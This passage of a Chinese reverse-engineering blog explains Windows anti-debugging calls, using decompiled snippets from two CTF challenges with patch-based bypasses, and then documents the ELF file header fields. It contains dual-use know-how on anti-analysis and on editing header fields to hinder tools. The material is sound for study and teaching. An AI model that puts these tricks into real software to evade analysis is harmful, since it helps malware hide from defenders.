<h2 id="NtQueryInformationProcess-ZwQueryInformationProcess"><a href="#NtQueryInformationProcess-ZwQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()"></a>NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>两个都是Windows中检查并获取进程信息的函数 区别在于调用方式和调用权限 Zw需要在内核态调用 Nt在用户态调用 主要起到反调试作用的是第二个参数<code>ProcessInformationClass</code></p>
<p>当该值为<code>ProcessDebugPort(0x07)</code>时返回缓冲区为<code>-1(调试状态), 0(非调试状态)</code></p>
<p>当该值为<code>ProcessDebugObjectHandle(0x1E)</code>时返回缓冲区为一个调试对象句柄<code>!=NULL(调试状态), NULL(非调试状态)</code></p>
<p>当该值为<code>ProcessDebugFlags(0x1F)</code>时返回缓冲区为<code>0(调试状态), 1(非调试状态)</code></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="LineCTF-rev-BrownFlagChecker"><a href="#LineCTF-rev-BrownFlagChecker" class="headerlink" title="LineCTF&#x2F;rev&#x2F;BrownFlagChecker"></a>LineCTF&#x2F;rev&#x2F;BrownFlagChecker</h4><p>其中有一个函数如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">anti_debug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall *SystemRoutineAddress)(__int64, __int64, __int64 *); <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">SystemRoutineName</span>;</span> <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+50h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;SystemRoutineName.Length = <span class="number">0x340032</span>;</span><br><span class="line">  SystemRoutineName.Buffer = <span class="string">L&quot;ZwQueryInformationProcess&quot;</span>;</span><br><span class="line">  SystemRoutineAddress = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">  <span class="keyword">if</span> ( !SystemRoutineAddress )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  SystemRoutineAddress(<span class="number">-1</span>i64, <span class="number">7</span>i64, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> v3 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="反制措施"><a href="#反制措施" class="headerlink" title="反制措施"></a>反制措施</h3><p>直接patch掉整个函数的调用或者修改控制流使得用于检测调试的信息失效</p>
<h2 id="NtSetInformationThread-ZwSetInformationThread"><a href="#NtSetInformationThread-ZwSetInformationThread" class="headerlink" title="NtSetInformationThread() &#x2F; ZwSetInformationThread()"></a>NtSetInformationThread() &#x2F; ZwSetInformationThread()</h2><p>两者的分别与上述差不多 功能是设置信息而不是检查信息 当第二个参数为<code>ThreadHideFromDebugger(0x11)</code>时将附加的调试器取消</p>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="XCTF-rev-Destination"><a href="#XCTF-rev-Destination" class="headerlink" title="XCTF&#x2F;rev&#x2F;Destination"></a>XCTF&#x2F;rev&#x2F;Destination</h4><p>其中一个预处理函数如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__thiscall <span class="title function_">sub_413750</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentThread; <span class="comment">// eax</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [esp+D0h] [ebp-2Ch]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4250E0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">    ModuleName[i] = (ModuleName[i] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">22</span>; ++j )</span><br><span class="line">    aS[j] = (aS[j] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">18</span>; ++k )</span><br><span class="line">    byte_423020[k] = (byte_423020[k] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  hModule = GetModuleHandleA(ModuleName);</span><br><span class="line">  ProcAddress = GetProcAddress(hModule, aS);</span><br><span class="line">  CurrentThread = GetCurrentThread();</span><br><span class="line">  (ProcAddress)(CurrentThread, <span class="number">0x11</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在创建线程处下断点调试到此处 可以看到<code>aS</code>数组储存的实际上是<code>ZwSetInformationThread</code> 而且第二个参数是0x11 这时在线程启动时调试器会被立刻取消</p>
<h3 id="反制措施-1"><a href="#反制措施-1" class="headerlink" title="反制措施"></a>反制措施</h3><p>将第二个参数patch为0</p>
]]></content>
      <tags>
        <tag>逆向</tag>
        <tag>反调试</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF文件头</title>
    <url>/2024/03/16/ELF%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>ELF文件头包含了该可执行文件的一些系统级信息:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e_ident[16]:ELF文件的标识 包括魔数和其他信息</span><br><span class="line">e_type:        文件类型 例如可执行文件, 目标文件, 共享目标文件等</span><br><span class="line">e_machine:    文件运行的CPU体系结构</span><br><span class="line">e_version:    ELF文件的版本号</span><br><span class="line">e_entry:    程序的入口点地址</span><br><span class="line">e_phoff:    程序头表在文件中的偏移量</span><br><span class="line">e_shoff:    节头表在文件中的偏移量</span><br><span class="line">e_flags:    处理器专用标志</span><br><span class="line">e_ehsize:    ELF文件头的大小</span><br><span class="line">e_phentsize:程序头表中每个条目的大小</span><br><span class="line">e_phnum:    程序头表中条目的数量</span><br><span class="line">e_shentsize:节头表中每个条目的大小</span><br><span class="line">e_shnum:    节头表中条目的数量</span><br><span class="line">e_shstrndx:    节头字符串表的索引</span><br></pre></td></tr></table></figure>

<p>更改其中的某些数据 例如程序入口点, 操作系统位数, 大小端序等 会导致程序运行流程改变 从而使得文件无法被工具识别 达到隐藏程序主要功能的目的</p>
<span id="more"></span>

<h3 id="文件头结构"><a href="#文件头结构" class="headerlink" title="文件头结构"></a>文件头结构</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT];</span><br><span class="line">        Elf32_Half      e_type;</span><br><span class="line">        Elf32_Half      e_machine;</span><br><span class="line">        Elf32_Word      e_version;</span><br><span class="line">        Elf32_Addr      e_entry;</span><br><span class="line">        Elf32_Off       e_phoff;</span><br><span class="line">        Elf32_Off       e_shoff;</span><br><span class="line">        Elf32_Word      e_flags;</span><br><span class="line">        Elf32_Half      e_ehsize;</span><br><span class="line">        Elf32_Half      e_phentsize;</span><br><span class="line">        Elf32_Half      e_phnum;</span><br><span class="line">        Elf32_Half      e_shentsize;</span><br><span class="line">        Elf32_Half      e_shnum;</span><br><span class="line">        Elf32_Half      e_shstrndx;</span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT];</span><br><span class="line">        Elf64_Half      e_type;</span><br><span class="line">        Elf64_Half      e_machine;</span><br><span class="line">        Elf64_Word      e_version;</span><br><span class="line">        Elf64_Addr      e_entry;</span><br><span class="line">        Elf64_Off       e_phoff;</span><br><span class="line">        Elf64_Off       e_shoff;</span><br><span class="line">        Elf64_Word      e_flags;</span><br><span class="line">        Elf64_Half      e_ehsize;</span><br><span class="line">        Elf64_Half      e_phentsize;</span><br><span class="line">        Elf64_Half      e_phnum;</span><br><span class="line">        Elf64_Half      e_shentsize;</span><br><span class="line">        Elf64_Half      e_shnum;</span><br><span class="line">        Elf64_Half      e_shstrndx;</span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure>

<p>其中各个字段所占字节数如下:</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th>In ELF32&#x2F;bytes</th>
<th>In ELF64&#x2F;bytes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">e_ident[16]</td>
<td>16</td>
<td>16</td>
</tr>
<tr>
<td align="left">e_type</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_machine</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_version</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td align="left">e_entry</td>
<td>4</td>
<td>8</td>
</tr>
<tr>
<td align="left">e_phoff</td>
<td>4</td>
<td>8</td>
</tr>
<tr>
<td align="left">e_shoff</td>
<td>4</td>
<td>8</td>
</tr>
<tr>
<td align="left">e_flags</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td align="left">e_ehsize</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_phentsize</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_phnum</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_shentsize</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_shnum</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_shstrndx</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">Total</td>
<td>52</td>
<td>64</td>
</tr>
</tbody></table>
<h3 id="各个字段所含值的含义"><a href="#各个字段所含值的含义" class="headerlink" title="各个字段所含值的含义"></a>各个字段所含值的含义</h3><h4 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h4><p>参考信息:<a href="https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html#elfid">https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html#elfid</a></p>
<p>其中索引对应的信息如下:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Purpose</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>EI_MAG0</code></td>
<td><code>0</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_MAG1</code></td>
<td><code>1</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_MAG2</code></td>
<td><code>2</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_MAG3</code></td>
<td><code>3</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_CLASS</code></td>
<td><code>4</code></td>
<td>File class</td>
</tr>
<tr>
<td><code>EI_DATA</code></td>
<td><code>5</code></td>
<td>Data encoding</td>
</tr>
<tr>
<td><code>EI_VERSION</code></td>
<td><code>6</code></td>
<td>File version</td>
</tr>
<tr>
<td><code>EI_OSABI</code></td>
<td><code>7</code></td>
<td>Operating system&#x2F;ABI identification</td>
</tr>
<tr>
<td><code>EI_ABIVERSION</code></td>
<td><code>8</code></td>
<td>ABI version</td>
</tr>
<tr>
<td><code>EI_PAD</code></td>
<td><code>9</code></td>
<td>Start of padding bytes</td>
</tr>
<tr>
<td><code>EI_NIDENT</code></td>
<td><code>16</code></td>
<td>Size of <code>e_ident[]</code></td>
</tr>
</tbody></table>
<p>前4字节通常是<code>b&quot;\x7fELF&quot;</code></p>
<p>e_ident[CLASS]指定了该程序为多少位程序:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ELFCLASSNONE</code></td>
<td><code>0</code></td>
<td>Invalid class</td>
</tr>
<tr>
<td><code>ELFCLASS32</code></td>
<td><code>1</code></td>
<td>32-bit objects</td>
</tr>
<tr>
<td><code>ELFCLASS64</code></td>
<td><code>2</code></td>
<td>64-bit objects</td>
</tr>
</tbody></table>
<p>e_ident[DATA]制定了该程序中数据的编码方式:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ELFDATANONE</code></td>
<td><code>0</code></td>
<td>Invalid data encoding</td>
</tr>
<tr>
<td><code>ELFDATA2LSB</code></td>
<td><code>1</code></td>
<td>Little ending</td>
</tr>
<tr>
<td><code>ELFDATA2MSB</code></td>
<td><code>2</code></td>
<td>Big ending</td>
</tr>
</tbody></table>
<p>e_ident[VERSION]指定当前ELF的版本 必须为EV_CURRENT  EV_CURRENT宏(正常为1)会根据未经更改的ELF文件版本确定</p>
<p>e_ident[OSABI]制定了程序在哪种平台上运行 使用哪种ABI(<code>ABI 是一个接口标准 用于定义二进制接口的规范 包括函数调用约定, 数据类型大小, 系统调用等方面的规定</code>):</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ELFOSABI_NONE</code></td>
<td><code>0</code></td>
<td>No extensions or unspecified</td>
</tr>
<tr>
<td><code>ELFOSABI_HPUX</code></td>
<td><code>1</code></td>
<td>Hewlett-Packard HP-UX</td>
</tr>
<tr>
<td><code>ELFOSABI_NETBSD</code></td>
<td><code>2</code></td>
<td>NetBSD</td>
</tr>
<tr>
<td><code>ELFOSABI_LINUX</code></td>
<td><code>3</code></td>
<td>Linux</td>
</tr>
<tr>
<td><code>ELFOSABI_SOLARIS</code></td>
<td><code>6</code></td>
<td>Sun Solaris</td>
</tr>
<tr>
<td><code>ELFOSABI_AIX</code></td>
<td><code>7</code></td>
<td>AIX</td>
</tr>
<tr>
<td><code>ELFOSABI_IRIX</code></td>
<td><code>8</code></td>
<td>IRIX</td>
</tr>
<tr>
<td><code>ELFOSABI_FREEBSD</code></td>
<td><code>9</code></td>
<td>FreeBSD</td>
</tr>
<tr>
<td><code>ELFOSABI_TRU64</code></td>
<td><code>10</code></td>
<td>Compaq TRU64 UNIX</td>
</tr>
<tr>
<td><code>ELFOSABI_MODESTO</code></td>
<td><code>11</code></td>
<td>Novell Modesto</td>
</tr>
<tr>
<td><code>ELFOSABI_OPENBSD</code></td>
<td><code>12</code></td>
<td>Open BSD</td>
</tr>
<tr>
<td><code>ELFOSABI_OPENVMS</code></td>
<td><code>13</code></td>
<td>Open VMS</td>
</tr>
<tr>
<td><code>ELFOSABI_NSK</code></td>
<td><code>14</code></td>
<td>Hewlett-Packard Non-Stop Kernel</td>
</tr>
<tr>
<td></td>
<td><code>64-255</code></td>
<td>Architecture-specific value range</td>
</tr>
</tbody></table>
<p>e_ident[EI_ABIVERSION]指定了所使用的ABI版本 区分不兼容的版本</p>
<p>e_ident[EI_PAD]制定了e_ident未使用的字节数 一开始为0 在未来使用了这些未使用的字节数时会改变</p>
<p>以64位Ubuntu的ls程序为例:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-165216.png" alt="QQ截图20240226163704"></p>
<h4 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h4><p>标记该文件具体类型:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ET_NONE</code></td>
<td><code>0</code></td>
<td>No file type</td>
</tr>
<tr>
<td><code>ET_REL</code></td>
<td><code>1</code></td>
<td>Relocatable file</td>
</tr>
<tr>
<td><code>ET_EXEC</code></td>
<td><code>2</code></td>
<td>Executable file</td>
</tr>
<tr>
<td><code>ET_DYN</code></td>
<td><code>3</code></td>
<td>Shared object file</td>
</tr>
<tr>
<td><code>ET_CORE</code></td>
<td><code>4</code></td>
<td>Core file</td>
</tr>
<tr>
<td><code>ET_LOOS</code></td>
<td><code>0xfe00</code></td>
<td>Operating system-specific</td>
</tr>
<tr>
<td><code>ET_HIOS</code></td>
<td><code>0xfeff</code></td>
<td>Operating system-specific</td>
</tr>
<tr>
<td><code>ET_LOPROC</code></td>
<td><code>0xff00</code></td>
<td>Processor-specific</td>
</tr>
<tr>
<td><code>ET_HIPROC</code></td>
<td><code>0xffff</code></td>
<td>Processor-specific</td>
</tr>
</tbody></table>
<p>对于ls 这个值是<code>03 00</code>也就是小端序的<code>3</code></p>
<h4 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h4><p>指定了程序机器码所使用的汇编体系:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>EM_NONE</code></td>
<td><code>0</code></td>
<td>No machine</td>
</tr>
<tr>
<td><code>EM_M32</code></td>
<td><code>1</code></td>
<td>AT&amp;T WE 32100</td>
</tr>
<tr>
<td><code>EM_SPARC</code></td>
<td><code>2</code></td>
<td>SPARC</td>
</tr>
<tr>
<td><code>EM_386</code></td>
<td><code>3</code></td>
<td>Intel 80386</td>
</tr>
<tr>
<td><code>EM_68K</code></td>
<td><code>4</code></td>
<td>Motorola 68000</td>
</tr>
<tr>
<td><code>EM_88K</code></td>
<td><code>5</code></td>
<td>Motorola 88000</td>
</tr>
<tr>
<td>reserved</td>
<td><code>6</code></td>
<td>Reserved for future use (was <code>EM_486</code>)</td>
</tr>
<tr>
<td><code>EM_860</code></td>
<td><code>7</code></td>
<td>Intel 80860</td>
</tr>
<tr>
<td><code>EM_MIPS</code></td>
<td><code>8</code></td>
<td>MIPS I Architecture</td>
</tr>
<tr>
<td><code>EM_S370</code></td>
<td><code>9</code></td>
<td>IBM System&#x2F;370 Processor</td>
</tr>
<tr>
<td><code>EM_MIPS_RS3_LE</code></td>
<td><code>10</code></td>
<td>MIPS RS3000 Little-endian</td>
</tr>
<tr>
<td>reserved</td>
<td><code>11-14</code></td>
<td>Reserved for future use</td>
</tr>
<tr>
<td><code>EM_PARISC</code></td>
<td><code>15</code></td>
<td>Hewlett-Packard PA-RISC</td>
</tr>
<tr>
<td>reserved</td>
<td><code>16</code></td>
<td>Reserved for future use</td>
</tr>
<tr>
<td><code>EM_VPP500</code></td>
<td><code>17</code></td>
<td>Fujitsu VPP500</td>
</tr>
<tr>
<td><code>EM_SPARC32PLUS</code></td>
<td><code>18</code></td>
<td>Enhanced instruction set SPARC</td>
</tr>
<tr>
<td><code>EM_960</code></td>
<td><code>19</code></td>
<td>Intel 80960</td>
</tr>
<tr>
<td><code>EM_PPC</code></td>
<td><code>20</code></td>
<td>PowerPC</td>
</tr>
<tr>
<td><code>EM_PPC64</code></td>
<td><code>21</code></td>
<td>64-bit PowerPC</td>
</tr>
<tr>
<td><code>EM_S390</code></td>
<td><code>22</code></td>
<td>IBM System&#x2F;390 Processor</td>
</tr>
<tr>
<td>reserved</td>
<td><code>23-35</code></td>
<td>Reserved for future use</td>
</tr>
<tr>
<td><code>EM_V800</code></td>
<td><code>36</code></td>
<td>NEC V800</td>
</tr>
<tr>
<td><code>EM_FR20</code></td>
<td><code>37</code></td>
<td>Fujitsu FR20</td>
</tr>
<tr>
<td><code>EM_RH32</code></td>
<td><code>38</code></td>
<td>TRW RH-32</td>
</tr>
<tr>
<td><code>EM_RCE</code></td>
<td><code>39</code></td>
<td>Motorola RCE</td>
</tr>
<tr>
<td><code>EM_ARM</code></td>
<td><code>40</code></td>
<td>Advanced RISC Machines ARM</td>
</tr>
<tr>
<td><code>EM_ALPHA</code></td>
<td><code>41</code></td>
<td>Digital Alpha</td>
</tr>
<tr>
<td><code>EM_SH</code></td>
<td><code>42</code></td>
<td>Hitachi SH</td>
</tr>
<tr>
<td><code>EM_SPARCV9</code></td>
<td><code>43</code></td>
<td>SPARC Version 9</td>
</tr>
<tr>
<td><code>EM_TRICORE</code></td>
<td><code>44</code></td>
<td>Siemens TriCore embedded processor</td>
</tr>
<tr>
<td><code>EM_ARC</code></td>
<td><code>45</code></td>
<td>Argonaut RISC Core, Argonaut Technologies Inc.</td>
</tr>
<tr>
<td><code>EM_H8_300</code></td>
<td><code>46</code></td>
<td>Hitachi H8&#x2F;300</td>
</tr>
<tr>
<td><code>EM_H8_300H</code></td>
<td><code>47</code></td>
<td>Hitachi H8&#x2F;300H</td>
</tr>
<tr>
<td><code>EM_H8S</code></td>
<td><code>48</code></td>
<td>Hitachi H8S</td>
</tr>
<tr>
<td><code>EM_H8_500</code></td>
<td><code>49</code></td>
<td>Hitachi H8&#x2F;500</td>
</tr>
<tr>
<td><code>EM_IA_64</code></td>
<td><code>50</code></td>
<td>Intel IA-64 processor architecture</td>
</tr>
<tr>
<td><code>EM_MIPS_X</code></td>
<td><code>51</code></td>
<td>Stanford MIPS-X</td>
</tr>
<tr>
<td><code>EM_COLDFIRE</code></td>
<td><code>52</code></td>
<td>Motorola ColdFire</td>
</tr>
<tr>
<td><code>EM_68HC12</code></td>
<td><code>53</code></td>
<td>Motorola M68HC12</td>
</tr>
<tr>
<td><code>EM_MMA</code></td>
<td><code>54</code></td>
<td>Fujitsu MMA Multimedia Accelerator</td>
</tr>
<tr>
<td><code>EM_PCP</code></td>
<td><code>55</code></td>
<td>Siemens PCP</td>
</tr>
<tr>
<td><code>EM_NCPU</code></td>
<td><code>56</code></td>
<td>Sony nCPU embedded RISC processor</td>
</tr>
<tr>
<td><code>EM_NDR1</code></td>
<td><code>57</code></td>
<td>Denso NDR1 microprocessor</td>
</tr>
<tr>
<td><code>EM_STARCORE</code></td>
<td><code>58</code></td>
<td>Motorola Star*Core processor</td>
</tr>
<tr>
<td><code>EM_ME16</code></td>
<td><code>59</code></td>
<td>Toyota ME16 processor</td>
</tr>
<tr>
<td><code>EM_ST100</code></td>
<td><code>60</code></td>
<td>STMicroelectronics ST100 processor</td>
</tr>
<tr>
<td><code>EM_TINYJ</code></td>
<td><code>61</code></td>
<td>Advanced Logic Corp. TinyJ embedded processor family</td>
</tr>
<tr>
<td><code>EM_X86_64</code></td>
<td><code>62</code></td>
<td>AMD x86-64 architecture</td>
</tr>
<tr>
<td><code>EM_PDSP</code></td>
<td><code>63</code></td>
<td>Sony DSP Processor</td>
</tr>
<tr>
<td><code>EM_PDP10</code></td>
<td><code>64</code></td>
<td>Digital Equipment Corp. PDP-10</td>
</tr>
<tr>
<td><code>EM_PDP11</code></td>
<td><code>65</code></td>
<td>Digital Equipment Corp. PDP-11</td>
</tr>
<tr>
<td><code>EM_FX66</code></td>
<td><code>66</code></td>
<td>Siemens FX66 microcontroller</td>
</tr>
<tr>
<td><code>EM_ST9PLUS</code></td>
<td><code>67</code></td>
<td>STMicroelectronics ST9+ 8&#x2F;16 bit microcontroller</td>
</tr>
<tr>
<td><code>EM_ST7</code></td>
<td><code>68</code></td>
<td>STMicroelectronics ST7 8-bit microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC16</code></td>
<td><code>69</code></td>
<td>Motorola MC68HC16 Microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC11</code></td>
<td><code>70</code></td>
<td>Motorola MC68HC11 Microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC08</code></td>
<td><code>71</code></td>
<td>Motorola MC68HC08 Microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC05</code></td>
<td><code>72</code></td>
<td>Motorola MC68HC05 Microcontroller</td>
</tr>
<tr>
<td><code>EM_SVX</code></td>
<td><code>73</code></td>
<td>Silicon Graphics SVx</td>
</tr>
<tr>
<td><code>EM_ST19</code></td>
<td><code>74</code></td>
<td>STMicroelectronics ST19 8-bit microcontroller</td>
</tr>
<tr>
<td><code>EM_VAX</code></td>
<td><code>75</code></td>
<td>Digital VAX</td>
</tr>
<tr>
<td><code>EM_CRIS</code></td>
<td><code>76</code></td>
<td>Axis Communications 32-bit embedded processor</td>
</tr>
<tr>
<td><code>EM_JAVELIN</code></td>
<td><code>77</code></td>
<td>Infineon Technologies 32-bit embedded processor</td>
</tr>
<tr>
<td><code>EM_FIREPATH</code></td>
<td><code>78</code></td>
<td>Element 14 64-bit DSP Processor</td>
</tr>
<tr>
<td><code>EM_ZSP</code></td>
<td><code>79</code></td>
<td>LSI Logic 16-bit DSP Processor</td>
</tr>
<tr>
<td><code>EM_MMIX</code></td>
<td><code>80</code></td>
<td>Donald Knuth’s educational 64-bit processor</td>
</tr>
<tr>
<td><code>EM_HUANY</code></td>
<td><code>81</code></td>
<td>Harvard University machine-independent object files</td>
</tr>
<tr>
<td><code>EM_PRISM</code></td>
<td><code>82</code></td>
<td>SiTera Prism</td>
</tr>
<tr>
<td><code>EM_AVR</code></td>
<td><code>83</code></td>
<td>Atmel AVR 8-bit microcontroller</td>
</tr>
<tr>
<td><code>EM_FR30</code></td>
<td><code>84</code></td>
<td>Fujitsu FR30</td>
</tr>
<tr>
<td><code>EM_D10V</code></td>
<td><code>85</code></td>
<td>Mitsubishi D10V</td>
</tr>
<tr>
<td><code>EM_D30V</code></td>
<td><code>86</code></td>
<td>Mitsubishi D30V</td>
</tr>
<tr>
<td><code>EM_V850</code></td>
<td><code>87</code></td>
<td>NEC v850</td>
</tr>
<tr>
<td><code>EM_M32R</code></td>
<td><code>88</code></td>
<td>Mitsubishi M32R</td>
</tr>
<tr>
<td><code>EM_MN10300</code></td>
<td><code>89</code></td>
<td>Matsushita MN10300</td>
</tr>
<tr>
<td><code>EM_MN10200</code></td>
<td><code>90</code></td>
<td>Matsushita MN10200</td>
</tr>
<tr>
<td><code>EM_PJ</code></td>
<td><code>91</code></td>
<td>picoJava</td>
</tr>
<tr>
<td><code>EM_OPENRISC</code></td>
<td><code>92</code></td>
<td>OpenRISC 32-bit embedded processor</td>
</tr>
<tr>
<td><code>EM_ARC_A5</code></td>
<td><code>93</code></td>
<td>ARC Cores Tangent-A5</td>
</tr>
<tr>
<td><code>EM_XTENSA</code></td>
<td><code>94</code></td>
<td>Tensilica Xtensa Architecture</td>
</tr>
<tr>
<td><code>EM_VIDEOCORE</code></td>
<td><code>95</code></td>
<td>Alphamosaic VideoCore processor</td>
</tr>
<tr>
<td><code>EM_TMM_GPP</code></td>
<td><code>96</code></td>
<td>Thompson Multimedia General Purpose Processor</td>
</tr>
<tr>
<td><code>EM_NS32K</code></td>
<td><code>97</code></td>
<td>National Semiconductor 32000 series</td>
</tr>
<tr>
<td><code>EM_TPC</code></td>
<td><code>98</code></td>
<td>Tenor Network TPC processor</td>
</tr>
<tr>
<td><code>EM_SNP1K</code></td>
<td><code>99</code></td>
<td>Trebia SNP 1000 processor</td>
</tr>
<tr>
<td><code>EM_ST200</code></td>
<td><code>100</code></td>
<td>STMicroelectronics (<a href="http://www.st.com/">www.st.com</a>) ST200 microcontroller</td>
</tr>
</tbody></table>
<p>在ls中这个值位<code>3E 00</code>即<code>EM_X86_64</code></p>
<h4 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h4><p>如上述e_ident[VERSION]所说 标记当前程序版本号</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>EV_NONE</code></td>
<td><code>0</code></td>
<td>Invalid version</td>
</tr>
<tr>
<td><code>EV_CURRENT</code></td>
<td><code>1</code></td>
<td>Current version</td>
</tr>
</tbody></table>
<p>在ls中这个值为<code>01 00 00 00</code></p>
<h4 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h4><p>指定一个虚拟地址来让系统从这个相对文件头的这个偏移地址开始翻译机器码并生成进程 要修改程序功能主要就是通过修改这个值</p>
<p>在ls中 这个值为<code>A0 6A 00 00 00 00 00 00 00</code> 意味着ls的程序入口点是<code>0x6AA0</code></p>
<h4 id="e-phoff-e-shoff"><a href="#e-phoff-e-shoff" class="headerlink" title="e_phoff &amp; e_shoff"></a>e_phoff &amp; e_shoff</h4><p>分别指定了程序头表和段表的偏移量 若没有则为0</p>
<h4 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h4><p>储存了决定处理器如何处理程序的标志 对不同处理器有不同的含义 常见的如下:</p>
<ol>
<li><strong>执行模式标志</strong>:  指示程序运行的特定执行模式或特权级别 如用户模式 , 内核模式等 </li>
<li><strong>处理器特性</strong>:  指示处理器的一些特定特性或功能 如浮点运算支持 , 多核处理器等 </li>
<li><strong>优化标志</strong>:  指示编译器在生成代码时应该使用的优化级别或优化策略 </li>
<li><strong>安全标志</strong>:  指示一些安全特性或安全策略 如栈保护 , 内存保护等 </li>
<li><strong>ABI 版本标志</strong>:  指示使用的 ABI 版本或兼容性标志 用于指定程序与操作系统或其他库的兼容性</li>
</ol>
